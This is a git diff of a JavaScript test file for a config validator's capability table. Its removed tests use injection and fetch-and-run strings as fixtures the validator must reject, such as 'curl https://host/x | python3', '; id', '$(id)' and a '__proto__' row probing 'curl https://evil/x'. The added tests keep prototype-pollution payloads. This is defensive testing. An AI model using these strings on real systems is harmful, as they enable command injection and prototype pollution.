@@ -1,8 +1,15 @@
-// The capability table's correctness IS the design, so this is the first test in
-// the repo that loads the REAL config/rca.config.json. Every other config-consuming
-// test (routing, evidence, conformance, loop-*) defines its own inline stub, which
-// means the shipped config has had zero schema coverage until now — a new block
-// could break nothing and also be guarded by nothing.
+// The capability table IS the design, and this is the only test that loads the REAL
+// config/rca.config.json — every other config-consuming test uses an inline stub, so
+// without this the shipped schema would be guarded by nothing.
+//
+// The table DESCRIBES capabilities; it no longer instructs. There are no probe
+// commands to validate here any more, which removed most of this file: a command
+// string arriving as data needed a leader allowlist, an interpolation guard and a
+// per-executable probe table, and produced an injection escape and a runtime-bias
+// defect anyway. What remains is the structure the run depends on.
+//
+// Assertions here were checked by mutation. Where one guards something a customer
+// can supply, the mutation is named in the test.
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -17,11 +24,8 @@ import {
   reportableUnavailable,
   validateTable,
 } from "../lib/capability-table.mjs";
-import { isRunnable } from "../lib/tool-cache.mjs";
 
 const ROOT = new URL("..", import.meta.url).pathname;
-// Parsed once. Every use here is read-only, and the tests that need to mutate a
-// copy build their own via stub().
 const SHIPPED = JSON.parse(readFileSync(join(ROOT, "config/rca.config.json"), "utf8"));
 const realConfig = () => SHIPPED;
 
@@ -36,516 +40,225 @@ function stub({ routing, capabilities } = {}) {
       github: {
         mandatory: true,
         resolvable: "partial",
-        fingerprints: { executables: ["gh"] },
-        probe: "gh api repos/{repo}",
+        intent: "Read the product's code and its merged-PR history.",
+        seedHints: { executables: ["gh"] },
         scopeFields: { repos: { consumer: "culprit-PR window" } },
       },
     },
   };
 }
 
-const codes = (violations) => violations.map((v) => v.code).sort();
+const codes = (violations) => [...new Set(violations.map((v) => v.code))].sort();
 
-// ---- the real config -------------------------------------------------------
+// ---- the shipped table ------------------------------------------------------
 
-test("the shipped config's capability table validates with zero violations", () => {
-  const { violations } = loadCapabilityTable(realConfig());
-  assert.deepEqual(
-    violations,
-    [],
-    `shipped table is invalid: ${violations.map((v) => v.message).join(" | ")}`,
-  );
+test("the shipped table validates with zero violations", () => {
+  assert.deepEqual(loadCapabilityTable(realConfig()).violations, []);
 });
 
-test("shipped table rows are exactly the capabilities evidenceRouting derives", () => {
-  const config = realConfig();
-  assert.deepEqual(
-    Object.keys(config.capabilities).sort(),
-    capabilitiesFromRouting(config).sort(),
-    "a row with no routed capability is an orphan; a routed capability with no row is unseeded",
-  );
-});
-
-test("every shipped row declares a permitted resolvable, and exactly one is mandatory", () => {
-  const config = realConfig();
-  const rows = Object.entries(config.capabilities);
-  assert.ok(rows.length > 0, "fixture must have rows, else the test proves nothing");
-  for (const [cap, row] of rows) {
-    assert.ok(RESOLVABLE.has(row.resolvable), `${cap} has resolvable '${row.resolvable}'`);
-  }
-  const mandatory = rows.filter(([, r]) => r.mandatory === true).map(([c]) => c);
-  assert.deepEqual(mandatory, ["github"], "GitHub is the only mandatory capability");
-});
-
-test("every shipped scope field names a downstream consumer", () => {
+test("the shipped table carries no probe commands at all", () => {
+  // The property, not a spot check: a command string in a row is the design this
+  // rewrite removed, and re-adding one silently would bring back the gate, the
+  // interpolation guard and the injection surface with it.
+  const forbidden = ["probe", "scopeProbe", "mcpProbe", "probesByExecutable", "fingerprints"];
   for (const [cap, row] of Object.entries(realConfig().capabilities)) {
-    for (const [name, spec] of Object.entries(row.scopeFields ?? {})) {
-      assert.ok(
-        typeof spec.consumer === "string" && spec.consumer.trim().length > 0,
-        `${cap}.${name} has no consumer — a question whose answer nothing reads must not be asked`,
-      );
+    for (const key of forbidden) {
+      assert.ok(!(key in row), `'${cap}' declares '${key}' — rows describe, they do not instruct`);
     }
   }
 });
 
-// test_logs carries {owner, skip} and no capability key at all. A naive
-// Object.values().map(e => e.capability) yields undefined and reports a phantom
-// unseeded capability — which is exactly what the first draft of this check did.
-test("test_logs contributes no capability, so it raises no unseeded violation", () => {
-  const config = realConfig();
-  assert.equal(config.evidenceRouting.test_logs.capability, undefined, "fixture assumption");
-  assert.ok(!capabilitiesFromRouting(config).includes(undefined));
-  const { violations } = loadCapabilityTable(config);
-  assert.equal(violations.filter((v) => v.code === "unseeded-capability").length, 0);
-});
-
-// ---- probe shape -----------------------------------------------------------
-
-test("docker ps validates on a docker-fingerprinted row — the case isRunnable refuses", () => {
-  // The whole reason probes do not go through isRunnable: its ALLOWED_LEADER is
-  // gh|kubectl|curl|git, so every non-Kubernetes infra probe would be unseedable.
-  assert.equal(isRunnable("docker ps").ok, false, "fixture: isRunnable must refuse this");
-
-  const violations = validateTable(
-    stub({ routing: { infra: { capability: "infra" } } }),
-    {
-      infra: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: ["docker"] },
-        probe: "docker ps",
-        scopeFields: {},
-      },
-    },
-  );
-  assert.deepEqual(codes(violations), []);
-});
-
-test("a row whose only route is MCP validates with mcpProbe and no CLI probe", () => {
-  const violations = validateTable(
-    stub({ routing: { kibana: { capability: "logs" } } }),
-    {
-      logs: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { mcp: ["loki"] },
-        mcpProbe: { tool: "{logsMcpTool}", args: { index: "{logIndex}" } },
-        scopeFields: { logIndex: { consumer: "log sweep target" } },
-      },
-    },
-  );
-  assert.deepEqual(codes(violations), []);
-});
-
-test("an always-asked row may omit fingerprints, probe, mcpProbe and scopeProbe", () => {
-  const violations = validateTable(
-    stub({ routing: { other: { capability: "other" } } }),
-    { other: { mandatory: true, resolvable: "always-asked", scopeFields: {} } },
-  );
-  assert.deepEqual(codes(violations), []);
-});
-
-test("a partial row with no probe of either kind is reported", () => {
-  const violations = validateTable(
-    stub({ routing: { other: { capability: "other" } } }),
-    {
-      other: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: ["gh"] },
-        scopeFields: {},
-      },
-    },
-  );
-  // Both fire, and they say different things: no probe of ANY kind exists, and the
-  // one executable this row fingerprints has nothing that leads with it.
-  assert.deepEqual(codes(violations), ["missing-probe", "unprobed-executable"]);
-});
-
-test("a piped probe is rejected even though isRunnable accepts it", () => {
-  // isRunnable allows pipelines into ALLOWED_FILTER, which includes python3.
-  // That is a cacheability judgement, not a safety boundary.
-  assert.equal(isRunnable("curl https://host/x | python3").ok, true, "fixture: isRunnable accepts this");
-
-  const violations = validateTable(stub(), {
-    github: {
-      mandatory: true,
-      resolvable: "partial",
-      fingerprints: { executables: ["curl"] },
-      probe: "curl https://host/x | python3",
-      scopeFields: {},
-    },
-  });
-  assert.deepEqual(codes(violations), ["bad-probe"]);
-  assert.match(violations[0].message, /single command/);
-});
-
-test("a probe leader absent from its row's fingerprints is rejected", () => {
-  const violations = validateTable(stub(), {
-    github: {
-      mandatory: true,
-      resolvable: "partial",
-      fingerprints: { executables: ["kubectl"] },
-      probe: "gh api repos/{repo}",
-      scopeFields: {},
-    },
-  });
-  // Two independent problems in one row: the probe leads with an executable the
-  // row does not declare, AND the executable it DOES declare has no probe.
-  assert.deepEqual(codes(violations), ["bad-probe", "unprobed-executable"]);
-  assert.match(
-    violations.find((v) => v.code === "bad-probe").message,
-    /narrows the catalog/,
-  );
-});
-
-test("a fingerprint naming a shell or interpreter fails regardless of the rest of the row", () => {
-  for (const shell of ["bash", "sh", "python3", "node", "perl", "ruby"]) {
-    const violations = validateTable(stub(), {
-      github: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: [shell] },
-        probe: `${shell} -c 'echo hi'`,
-        scopeFields: {},
-      },
-    });
-    assert.ok(
-      violations.some((v) => v.code === "bad-fingerprint"),
-      `${shell} must be refused as a declared fingerprint executable`,
-    );
+test("every discoverable capability states its intent", () => {
+  // `intent` is what an agent reasons from when the customer's stack matches no
+  // hint. Without it there is nothing to generalise from, which is how a fingerprint
+  // list ends up telling a New Relic user to install promtool.
+  for (const [cap, row] of Object.entries(realConfig().capabilities)) {
+    if (row.resolvable !== "partial") continue;
+    assert.ok(String(row.intent ?? "").trim().length > 40, `'${cap}' needs a real intent sentence`);
+    assert.match(row.intent, /[Vv]erified means/, `'${cap}' intent must say what verified means`);
   }
 });
 
-test("an angle-bracket placeholder is rejected, with the redirect reason surfaced", () => {
-  const violations = validateTable(stub(), {
-    github: {
-      mandatory: true,
-      resolvable: "partial",
-      fingerprints: { executables: ["gh"] },
-      probe: "gh api repos/<repo>",
-      scopeFields: {},
-    },
-  });
-  assert.deepEqual(codes(violations), ["bad-probe"]);
-  assert.match(violations[0].message, /redirect/);
-});
-
-test("an unquoted shell metacharacter is rejected even when it tokenizes as part of a word", () => {
-  // Regression: `--base main; id` tokenizes as ["--base", "main;", "id"], so the
-  // standalone-operator check never sees a `;` and accepted it. Not exploitable
-  // (execFile, no shell) but the probe is silently wrong, and claiming operators
-  // are rejected while accepting an attached one is a false guarantee.
-  for (const bad of ["gh api repos/x; id", "gh api repos/x && id", "gh api repos/$(id)", "gh api repos/`id`"]) {
-    const violations = validateTable(stub(), {
-      github: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: ["gh"] },
-        probe: bad,
-        scopeFields: {},
-      },
-    });
-    assert.deepEqual(codes(violations), ["bad-probe"], `${bad} must be refused`);
-    assert.match(violations[0].message, /metacharacter|redirect/);
+test("every scope field names a downstream consumer", () => {
+  // The check can only prove the string is non-empty, not that a consumer exists —
+  // three fields once carried plausible-sounding consumers that nothing read. Each
+  // consumer here names the step that reads it, so a reviewer can check it.
+  for (const [cap, row] of Object.entries(realConfig().capabilities)) {
+    for (const [field, spec] of Object.entries(row.scopeFields ?? {})) {
+      assert.ok(String(spec?.consumer ?? "").trim(), `${cap}.${field} has no consumer`);
+    }
   }
 });
 
-test("a quoted metacharacter is still allowed — quoting is respected", () => {
-  const violations = validateTable(stub(), {
+test("capabilities are derived from evidenceRouting, skipping what the manifest cannot hold", () => {
+  // test_logs carries {owner:"tfa", skip:true} and no capability, so a naive
+  // Object.values().map() yields undefined and reports a phantom unseeded capability.
+  assert.deepEqual(capabilitiesFromRouting(realConfig()).sort(),
+    ["github", "infra", "logs", "metrics", "other"]);
+  assert.deepEqual(capabilitiesFromRouting({}), []);
+  assert.deepEqual(capabilitiesFromRouting({ evidenceRouting: { x: { capability: "a", skip: true } } }), []);
+});
+
+// ---- structural validation --------------------------------------------------
+
+test("a routed capability with no row is unseeded; a row with no route is an orphan", () => {
+  const noRow = validateTable(stub({ routing: { product_code: { capability: "github" }, k8s: { capability: "infra" } } }));
+  assert.ok(codes(noRow).includes("unseeded-capability"));
+
+  const noRoute = validateTable(stub(), { ...stub().capabilities, ci: { resolvable: "partial" } });
+  assert.ok(codes(noRoute).includes("orphan-row"));
+});
+
+test("resolvable must be one of the two real values", () => {
+  const v = validateTable(stub(), {
+    github: { mandatory: true, resolvable: "always", intent: "x. Verified means y.", scopeFields: {} },
+  });
+  assert.ok(codes(v).includes("bad-resolvable"));
+  assert.deepEqual([...RESOLVABLE].sort(), ["always-asked", "partial"]);
+});
+
+test("exactly one capability is mandatory", () => {
+  const none = validateTable(stub(), { github: { resolvable: "partial", intent: "a. Verified means b.", scopeFields: {} } });
+  assert.ok(codes(none).includes("mandatory-count"));
+});
+
+test("an always-asked row declaring hints is a violation", () => {
+  // Nothing consults hints for an always-asked row, so they would describe
+  // behaviour that never happens.
+  const v = validateTable(
+    stub({ routing: { other: { capability: "other" } } }),
+    { other: { mandatory: true, resolvable: "always-asked", seedHints: { executables: ["gh"] }, scopeFields: {} } },
+  );
+  assert.deepEqual(codes(v), ["always-asked-with-hints"]);
+});
+
+test("a malformed seedHint list is reported", () => {
+  const v = validateTable(stub(), {
     github: {
-      mandatory: true,
-      resolvable: "partial",
-      fingerprints: { executables: ["gh"] },
-      probe: "gh pr list --search 'merged:2026-01-01..2026-02-01'",
-      scopeFields: {},
+      mandatory: true, resolvable: "partial", intent: "a. Verified means b.",
+      seedHints: { executables: "gh", mcp: [""], files: ["ok"] }, scopeFields: {},
     },
   });
-  assert.deepEqual(codes(violations), []);
+  assert.deepEqual(codes(v), ["bad-seed-hint"]);
+  assert.equal(v.filter((x) => x.code === "bad-seed-hint").length, 2, "one per malformed list");
 });
 
-test("a malformed mcpProbe is reported", () => {
-  const violations = validateTable(
-    stub({ routing: { kibana: { capability: "logs" } } }),
-    {
-      logs: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { mcp: ["loki"] },
-        mcpProbe: { tool: "", args: [] },
-        scopeFields: {},
-      },
-    },
-  );
-  // Present-but-malformed is not the same as missing: the row DID declare a probe
-  // form, so the two shape violations say exactly what is wrong and a generic
-  // missing-probe on top would be noise.
-  assert.deepEqual(codes(violations), ["bad-mcp-probe", "bad-mcp-probe"]);
-  assert.deepEqual(
-    violations.map((v) => v.field).sort(),
-    ["mcpProbe.args", "mcpProbe.tool"],
-  );
-});
-
-// ---- structural violations -------------------------------------------------
-
-test("a row for a capability evidenceRouting does not route is an orphan", () => {
-  // The literal mistake this catches: seeding a `ci` row. `ci` is an evidenceType
-  // that routes to github, not a capability of its own.
-  const config = stub();
-  config.capabilities.ci = {
-    resolvable: "partial",
-    fingerprints: { executables: ["gh"] },
-    probe: "gh api repos/{repo}",
-    scopeFields: {},
-  };
-  const violations = validateTable(config, config.capabilities);
-  assert.deepEqual(codes(violations), ["orphan-row"]);
-  assert.match(violations[0].message, /evidenceType mistaken for a capability/);
-});
-
-test("a routed capability with no row is unseeded", () => {
-  const config = stub();
-  config.evidenceRouting.metrics = { capability: "metrics" };
-  const violations = validateTable(config, config.capabilities);
-  assert.deepEqual(codes(violations), ["unseeded-capability"]);
+test("a discoverable row with no intent is reported", () => {
+  const v = validateTable(stub(), {
+    github: { mandatory: true, resolvable: "partial", seedHints: { executables: ["gh"] }, scopeFields: {} },
+  });
+  assert.deepEqual(codes(v), ["missing-intent"]);
 });
 
 test("a scope field with no consumer is reported", () => {
-  const violations = validateTable(stub(), {
+  const v = validateTable(stub(), {
     github: {
-      mandatory: true,
-      resolvable: "partial",
-      fingerprints: { executables: ["gh"] },
-      probe: "gh api repos/{repo}",
+      mandatory: true, resolvable: "partial", intent: "a. Verified means b.",
       scopeFields: { repos: { consumer: "  " } },
     },
   });
-  assert.deepEqual(codes(violations), ["missing-consumer"]);
-});
-
-test("zero or several mandatory capabilities is reported", () => {
-  const none = validateTable(stub(), {
-    github: {
-      resolvable: "always-asked",
-      scopeFields: {},
-    },
-  });
-  assert.deepEqual(codes(none), ["mandatory-count"]);
-});
-
-test("an always-asked row declaring fingerprints is a violation", () => {
-  // discover() ignores fingerprints on an always-asked row, so declaring them
-  // documents behaviour that never happens. Rejecting it at load time is what lets
-  // the defensive branch in discover() guard a state the loader already refuses.
-  const violations = validateTable(
-    stub({ routing: { other: { capability: "other" } } }),
-    {
-      other: {
-        mandatory: true,
-        resolvable: "always-asked",
-        fingerprints: { executables: ["gh"] },
-        scopeFields: {},
-      },
-    },
-  );
-  assert.deepEqual(codes(violations), ["always-asked-with-fingerprints"]);
-});
-
-test("`always` is no longer a permitted resolvable", () => {
-  assert.deepEqual([...RESOLVABLE].sort(), ["always-asked", "partial"]);
-  const violations = validateTable(stub(), {
-    github: { mandatory: true, resolvable: "always", fingerprints: { executables: ["gh"] }, probe: "gh api repos/{repo}", scopeFields: {} },
-  });
-  assert.ok(violations.some((v) => v.code === "bad-resolvable"));
-});
-
-test("exemptFromDiscoveryReport suppresses a capability from the human-facing line only", () => {
-  // The flag had no reader at all: it sat in the config with a comment describing
-  // behaviour no code implemented, which is the table's own missing-consumer rule
-  // violated by the table itself.
-  const table = realConfig().capabilities;
-  const unavailable = ["infra", "logs", "other"];
-  assert.deepEqual(reportableUnavailable(unavailable, table), ["infra", "logs"]);
-  assert.ok(unavailable.includes("other"), "the manifest still marks it unavailable");
-  assert.deepEqual(reportableUnavailable(unavailable, {}), unavailable, "no table means no suppression");
-});
-
-// ---- overlay ---------------------------------------------------------------
-
-test("an overlay row merges scope data over the shipped row of the same name", () => {
-  const shipped = {
-    github: {
-      mandatory: true,
-      resolvable: "partial",
-      fingerprints: { executables: ["gh"] },
-      probe: "gh api repos/{repo}",
-      scopeFields: { repos: { consumer: "culprit-PR window" } },
-    },
-  };
-  const { table, violations } = mergeOverlay(shipped, {
-    github: { scopeFields: { repos: { consumer: "culprit-PR window" }, subpaths: { consumer: "path overlap" } } },
-  });
-  assert.deepEqual(violations, []);
-  assert.deepEqual(Object.keys(table.github.scopeFields).sort(), ["repos", "subpaths"]);
-  assert.equal(table.github.probe, "gh api repos/{repo}", "shipped probe survives the merge");
-  assert.deepEqual(shipped.github.scopeFields, { repos: { consumer: "culprit-PR window" } }, "shipped table not mutated");
-});
-
-test("an overlay may not set fingerprints or any probe field, and each is named", () => {
-  // Without this the probe-shape restriction is self-certifying: the leader
-  // allowlist would come from the same customer-controlled row as the probe.
-  for (const field of OVERLAY_FORBIDDEN) {
-    const { table, violations } = mergeOverlay(
-      { github: { resolvable: "partial", fingerprints: { executables: ["gh"] }, probe: "gh api repos/{repo}" } },
-      { github: { [field]: field === "mcpProbe" ? { tool: "x" } : ["bash"] } },
-    );
-    assert.deepEqual(codes(violations), ["overlay-forbidden-field"], `${field} must be refused`);
-    assert.equal(violations[0].field, field, "the violation names the offending field");
-    assert.deepEqual(
-      table.github.fingerprints,
-      { executables: ["gh"] },
-      "the shipped value survives — the overlay key is dropped, not applied",
-    );
-  }
-});
-
-test("validation runs on the merged table, not the shipped table alone", () => {
-  // A shipped table that is valid on its own must not launder an invalid overlay.
-  const config = stub();
-  const { table, violations: mergeViolations } = mergeOverlay(config.capabilities, {
-    github: { scopeFields: { subpaths: {} } },
-  });
-  assert.deepEqual(mergeViolations, [], "the overlay touches only permitted fields");
-  assert.deepEqual(validateTable(config, config.capabilities), [], "shipped alone is valid");
-  assert.deepEqual(
-    codes(validateTable(config, table)),
-    ["missing-consumer"],
-    "the overlay's consumer-less field is caught post-merge",
-  );
-});
-
-test("loadCapabilityTable reports merge and validation violations together", () => {
-  const config = stub();
-  const { violations } = loadCapabilityTable(config, {
-    github: { probe: "bash -c 'x'", scopeFields: { subpaths: {} } },
-  });
-  assert.deepEqual(codes(violations), ["missing-consumer", "overlay-forbidden-field"]);
+  assert.deepEqual(codes(v), ["missing-consumer"]);
 });
 
 // ---- the overlay boundary ---------------------------------------------------
 
-test("a prototype key cannot smuggle a row past validation", () => {
-  // `table[cap] = {...}` with cap === "__proto__" walks the prototype chain instead
-  // of creating an own property. The row was then reachable as `table[cap]` and via
-  // `cap in table`, while Object.keys/entries never listed it — so validateTable,
-  // which iterates entries, never saw it and never ran its probe through the gate.
-  // preFillFromConnectorSkills does `table[cap]` with cap from a connector file and
-  // reads `row.fingerprints.executables` as the leader allowlist, so the injected
-  // row would have authorised its own probe leader: exactly what OVERLAY_FORBIDDEN
-  // exists to prevent, arriving in a git-committed file.
-  const hostile = JSON.parse(
-    '{"__proto__":{"ci":{"probe":"curl https://evil/x","fingerprints":{"executables":["curl"]}}}}',
-  );
-  const { table, violations } = mergeOverlay({ github: { resolvable: "partial" } }, hostile);
-  assert.deepEqual(violations.map((v) => v.code), ["overlay-unsafe-key"]);
-  assert.equal("ci" in table, false, "the row must not be reachable by lookup");
-  assert.equal(table.ci, undefined);
-
-  for (const key of ["constructor", "prototype"]) {
-    const r = mergeOverlay({}, JSON.parse(`{"${key}":{"x":1}}`));
-    assert.deepEqual(r.violations.map((v) => v.code), ["overlay-unsafe-key"], key);
-  }
+test("an overlay may seed hints and scope fields for a stack the table does not name", () => {
+  // This is what makes the product generic without a code change. It is only safe
+  // because a hint no longer authorises a command — there are no commands. The
+  // route it produces still has to be verified by a reported check.
+  const { table, violations } = mergeOverlay(realConfig().capabilities, {
+    metrics: {
+      seedHints: { mcp: ["newrelic", "dynatrace"] },
+      scopeFields: { metricsAccount: { consumer: "scopes the pressure lookup in Step 4" } },
+    },
+  });
+  assert.deepEqual(violations, []);
+  assert.deepEqual(table.metrics.seedHints.mcp, ["newrelic", "dynatrace"]);
+  assert.deepEqual(Object.keys(table.metrics.scopeFields).sort(), ["metricsAccount", "metricsNamespace"],
+    "merged, not replaced");
 });
 
-test("an overlay cannot move the mandatory capability", () => {
-  // Setting github.mandatory=false and infra.mandatory=true produced ZERO
-  // violations: the "exactly one mandatory" count still came to one, so the
-  // mandatory capability silently moved off GitHub while MANDATORY_CAPABILITY in
-  // lib/verify.mjs still said "github". The invariant the two are meant to share
-  // was decorative.
-  const { table, violations } = mergeOverlay(
-    { github: { mandatory: true, resolvable: "partial" }, infra: { resolvable: "partial" } },
-    { github: { mandatory: false }, infra: { mandatory: true } },
-  );
-  assert.deepEqual(
-    violations.map((v) => `${v.capability}.${v.field}`).sort(),
-    ["github.mandatory", "infra.mandatory"],
-  );
+test("an overlay cannot move the mandatory capability or flip resolvability", () => {
+  // github.mandatory=false + infra.mandatory=true once produced ZERO violations —
+  // the count still came to one, so the mandatory capability moved silently while
+  // MANDATORY_CAPABILITY still said github.
+  const { table, violations } = mergeOverlay(realConfig().capabilities, {
+    github: { mandatory: false, resolvable: "always-asked" },
+    infra: { mandatory: true },
+  });
+  assert.deepEqual(codes(violations), ["overlay-forbidden-field"]);
   assert.equal(table.github.mandatory, true, "the shipped value survives");
+  assert.equal(table.github.resolvable, "partial");
   assert.equal(table.infra.mandatory, undefined);
 });
 
-test("an overlay cannot delete the questions a shipped row declares", () => {
-  // A shallow spread let `scopeFields: {}` wipe every declared field — silently,
-  // with no violation. For github that removed the repo and base-branch questions
-  // the mandatory capability depends on.
-  const shipped = {
-    github: { resolvable: "partial", scopeFields: { repos: { consumer: "a" }, baseBranch: { consumer: "b" } } },
-  };
-  const wiped = mergeOverlay(shipped, { github: { scopeFields: {} } });
-  assert.deepEqual(Object.keys(wiped.table.github.scopeFields).sort(), ["baseBranch", "repos"]);
-
-  // Adding is still allowed — merge, not freeze.
-  const added = mergeOverlay(shipped, { github: { scopeFields: { extra: { consumer: "c" } } } });
-  assert.deepEqual(Object.keys(added.table.github.scopeFields).sort(), ["baseBranch", "extra", "repos"]);
+test("an overlay cannot hide a missing capability from the gate", () => {
+  // MUTATION: drop exemptFromDiscoveryReport from OVERLAY_FORBIDDEN and this fails.
+  // A committed overlay setting it on infra, logs and metrics would suppress all
+  // three from the one confirmation gate — the row deciding what is said about the
+  // row, which is the same shape as the mandatory hole.
+  const { table, violations } = mergeOverlay(realConfig().capabilities, {
+    infra: { exemptFromDiscoveryReport: true },
+    logs: { exemptFromDiscoveryReport: true },
+  });
+  assert.deepEqual(codes(violations), ["overlay-forbidden-field"]);
+  assert.deepEqual(
+    reportableUnavailable(["github", "infra", "logs", "metrics", "other"], table).sort(),
+    ["github", "infra", "logs", "metrics"],
+    "only the catch-all stays suppressed",
+  );
 });
 
-test("every fingerprinted executable must have a probe that leads with it", () => {
-  // Two live defects shared this shape: infra fingerprinted kubectl, docker, aws,
-  // nomad and pm2 while shipping one kubectl probe — so a Nomad machine ran
-  // `kubectl get pods`, failed, and had the failure recorded as ITS scope being
-  // invalid — and logs/metrics fingerprinted logcli/promtool with no CLI probe at
-  // all. In both cases the customer was blamed for a gap in our table.
-  const violations = validateTable(
-    stub({ routing: { infra: { capability: "infra" } } }),
-    {
-      infra: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: ["kubectl", "nomad"] },
-        probe: "kubectl version",
-        scopeFields: {},
-      },
-    },
-  );
-  assert.deepEqual(codes(violations), ["unprobed-executable"]);
-  assert.match(violations[0].message, /nomad/);
+test("an overlay cannot overwrite intent", () => {
+  const { table, violations } = mergeOverlay(realConfig().capabilities, { logs: { intent: "whatever I say it is" } });
+  assert.deepEqual(codes(violations), ["overlay-forbidden-field"]);
+  assert.match(table.logs.intent, /application's own logs/);
 });
 
-test("a per-executable probe may not lead with a different executable", () => {
-  const violations = validateTable(
-    stub({ routing: { infra: { capability: "infra" } } }),
-    {
-      infra: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: ["docker"] },
-        probesByExecutable: { docker: { probe: "kubectl version" } },
-        scopeFields: {},
-      },
-    },
-  );
-  // One violation, not two. The row DOES declare a docker probe, so reporting
-  // "docker is unprobed" alongside it would be misleading — `bad-probe` already
-  // names the field and the reason, with the leader narrowed to the key.
-  assert.deepEqual(codes(violations), ["bad-probe"]);
-  assert.equal(violations[0].field, "probesByExecutable.docker.probe");
-  assert.match(violations[0].message, /narrows the catalog/);
+test("OVERLAY_FORBIDDEN names exactly the fields the shipped table owns", () => {
+  assert.deepEqual([...OVERLAY_FORBIDDEN].sort(),
+    ["exemptFromDiscoveryReport", "intent", "mandatory", "resolvable"]);
 });
 
-test("a per-executable probe for an executable the row does not fingerprint is dead", () => {
-  const violations = validateTable(
-    stub({ routing: { infra: { capability: "infra" } } }),
-    {
-      infra: {
-        mandatory: true,
-        resolvable: "partial",
-        fingerprints: { executables: ["docker"] },
-        probesByExecutable: { docker: { probe: "docker version" }, helm: { probe: "helm version" } },
-        scopeFields: {},
-      },
-    },
-  );
-  assert.deepEqual(codes(violations), ["orphan-probe"]);
+test("a prototype key cannot smuggle a row past validation", () => {
+  // `table[cap] = {...}` with cap === "__proto__" walks the prototype chain instead
+  // of creating an own property: the row was reachable as table[cap] and via
+  // `cap in table`, while Object.keys never listed it — so validateTable, which
+  // iterates entries, never saw it.
+  const hostile = JSON.parse('{"__proto__":{"ci":{"seedHints":{"executables":["curl"]}}}}');
+  const { table, violations } = mergeOverlay({ github: { resolvable: "partial" } }, hostile);
+  assert.deepEqual(codes(violations), ["overlay-unsafe-key"]);
+  assert.equal("ci" in table, false, "the row must not be reachable by lookup");
+  assert.equal(Object.getPrototypeOf(table), null, "the table is prototype-less by construction");
+
+  for (const key of ["constructor", "prototype"]) {
+    assert.deepEqual(codes(mergeOverlay({}, JSON.parse(`{"${key}":{"x":1}}`)).violations), ["overlay-unsafe-key"]);
+  }
+});
+
+test("a prototype key inside a row is rejected too", () => {
+  const { violations } = mergeOverlay({ logs: { resolvable: "partial" } },
+    JSON.parse('{"logs":{"__proto__":{"polluted":true},"scopeFields":{}}}'));
+  assert.ok(codes(violations).includes("overlay-unsafe-key"));
+  assert.equal({}.polluted, undefined, "Object.prototype is untouched");
+});
+
+test("a malformed overlay row is named, not silently dropped", () => {
+  const { violations } = mergeOverlay({ logs: {} }, { logs: "not an object" });
+  assert.deepEqual(codes(violations), ["overlay-malformed-row"]);
+});
+
+test("validation runs on the merged table, not the shipped one alone", () => {
+  // Validating only the shipped rows would treat customer data as pre-trusted.
+  const { violations } = loadCapabilityTable(realConfig(), { logs: { scopeFields: { bogus: {} } } });
+  assert.ok(codes(violations).includes("missing-consumer"),
+    "a customer-supplied field with no consumer must still be caught");
+});
+
+// ---- reporting --------------------------------------------------------------
+
+test("the catch-all is suppressed from the human-facing line only", () => {
+  const { table } = loadCapabilityTable(realConfig());
+  assert.deepEqual(reportableUnavailable(["infra", "logs", "other"], table), ["infra", "logs"]);
+  assert.deepEqual(reportableUnavailable(["infra", "other"], {}), ["infra", "other"], "no table means no suppression");
 });
